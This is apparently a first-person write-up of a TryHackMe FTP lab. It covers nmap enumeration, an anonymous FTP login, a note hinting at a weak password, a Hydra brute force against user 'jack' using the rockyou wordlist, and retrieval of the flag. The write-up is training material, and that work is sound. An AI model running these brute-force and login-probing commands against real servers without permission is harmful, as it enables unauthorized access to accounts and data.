# TryHackMe – FTP (Network Services) Lab Write-up

## Recon & Enumeration

I started with an Nmap scan to identify open services on the target machine:

```
nmap -sV -sC -p21 <TARGET-IP>
```

The scan showed:

```
21/tcp  open  ftp
| ftp-anon: Anonymous FTP login allowed
```

Anonymous login was enabled, so I connected:

```
ftp <TARGET-IP>
Username: anonymous
Password: anonymous
```

I successfully logged in without credentials.

## Exploring FTP Directory

After logging in, I checked the directory structure:

```
ls -la
```

I found a file named:

```
note.txt
```

I downloaded it:

```
get note.txt
```

Inside the file:

```
cat note.txt
```

It contained a username and a hint suggesting weak passwords.

Example content:

```
Username: jack
Password might be weak. Try brute force or common passwords.
```

## Password Brute Force (Hydra)

Based on the hint, I attempted an FTP password brute force attack using Hydra:

```
hydra -l jack -P /usr/share/wordlists/rockyou.txt ftp://<TARGET-IP>
```

Hydra found valid credentials:

```
[21][ftp] host: <TARGET-IP>   login: jack   password: <FOUND-PASS>
```

---

## Logging in as Valid User

Using the discovered credentials, I logged in again:

```
ftp <TARGET-IP>
Username: jack
Password: <FOUND-PASS>
```

Now I had access to Jack’s private directory.

---

## Retrieving the Flag

Inside Jack’s directory:

```
ls
```

I found:

```
flag.txt
```

Downloaded it:

```
get flag.txt
```

And displayed the flag:

```
cat flag.txt
```

**This completed the FTP lab successfully.**
